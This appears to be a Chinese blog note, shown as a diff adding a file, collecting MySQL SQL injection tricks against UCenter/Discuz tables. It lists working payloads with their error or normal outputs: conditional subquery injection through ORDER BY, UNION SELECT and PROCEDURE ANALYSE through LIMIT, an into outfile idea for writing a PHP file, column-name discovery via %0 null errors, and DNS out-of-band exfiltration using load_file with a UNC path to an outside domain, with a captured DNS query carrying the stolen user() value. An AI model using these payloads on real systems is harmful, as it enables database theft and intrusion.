@@ -1,0 +1,55 @@
+很多技巧从国外的paper学到的，不过国内没有多少人使用，所以发出来，笔记下~
+
+一、order by 的参数注入技巧：
+两种方法，思路都一样。
+
+example. “select username,password from uc_members order by”.$_GET['oderby']
+
+a.常见的利用方法：
+1.[SQL] select username,password from uc_members order by 1,If((select 1)=2,1,(select value from uc_settings));
+返回错误：[Err] 1242 – Subquery returns more than 1 row
+2.[SQL] select username,password from uc_members order by 1,If((select 1)=1,1,(select value from uc_settings));
+返回正常。
+
+b.国外paper看到的方法：
+1.[SQL] select username,password from uc_members order by 1,(select case when(2<1) then 1 else 1*(select username from uc_members)end)=1;
+返回错误：[Err] 1242 - Subquery returns more than 1 row
+2.[SQL] select username,password from uc_members order by 1,(select case when(2>1) then 1 else 1*(select username from uc_members)end)=1;
+返回正常。
+
+二、limit 的参数注入技巧：
+
+a.order by之后的limit参数 的注入，因为正常的sql语句order by后无法接union，所以没有好办法，就一个鸡肋思路：into outfile ‘/www/root/xxx.php’;
+
+b.limit前无order by时的注入，那就方便多了，后面可以直接接union select ，随便怎么注都行了：
+select * from cdb_members limit 1 union select 1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7,8,9,10,1,2,3,4,5,6,7
+这里还有个技巧，使用procedure analyse可以获取字段名称：
+select * from cdb_members where uid=1 limit 1,1 procedure analyse()
+不过procedure analyse同样不能使用在order by之后：
+[SQL] select * from cdb_members order by uid desc limit 1 procedure analyse()
+[Err] 1386 – Can’t use ORDER clause with this procedure
+
+三、无法猜测字段时的技巧：
+
+在mysql5以下版本或者information_schema 无法访问的时候，无法猜到某个表的字段名，于是可以采用这个办法，在子查询中使用%0，报错获得列名。以ucenter的uc_members为例。
+
+1.猜测列数：SELECT 1 FROM `uc_members` where (SELECT * FROM `uc_members`)=(1)
+返回错误：#1241 – Operand should contain 12 column(s)
+2.SELECT 1 FROM `uc_members` where (1,2,3,4,5,6,7,8,9,10,11,12)=(SELECT * FROM `uc_members` union select 1,2,3,4,5,6,7,8,9,10,11,12 limit 1)
+返回正常。
+3.SELECT 1 FROM `uc_members` where (1,2,3,4,5,6,7,8,9,10,11,12)=(SELECT * FROM `uc_members` union select 1%0,2,3,4,5,6,7,8,9,10,11,12 limit 1)
+返回错误：#1048 – Column ‘uid’ cannot be null
+4.SELECT 1 FROM `uc_members` where (1,2,3,4,5,6,7,8,9,10,11,12)=(SELECT * FROM `uc_members` union select 1,2%0,3,4,5,6,7,8,9,10,11,12 limit 1)
+返回错误：#1048 – Column ‘username’ cannot be null
+5. ……
+
+注：5.1以上版本不适用，字段必须为非空（not null）
+
+四、windows下利用dns解析盲注的技巧：
+
+如果盲注很累，或者页面无论and 1=1还是and 1=2的时候返回都一模一样，这个时候利用dns进行注入是个不错的方法，前提是win环境root权限下的mysql，利用load_file函数读取远程文件的思路。本地搭建一个dns服务器，然后将特定域名的NS server转过来。然后进行注入，并抓包。
+
+本地测试了下（实际注入中单引号可以编码）：select load_file(concat(‘\\\\aaa1.’,(select user()),’.oldjun.com\\a.txt’))，抓包成功获得select的结果：
+29 28.524843 192.168.9.107 192.168.1.2 DNS Standard query A aaa1.root@localhost.oldjun.com
+
+如图所示：
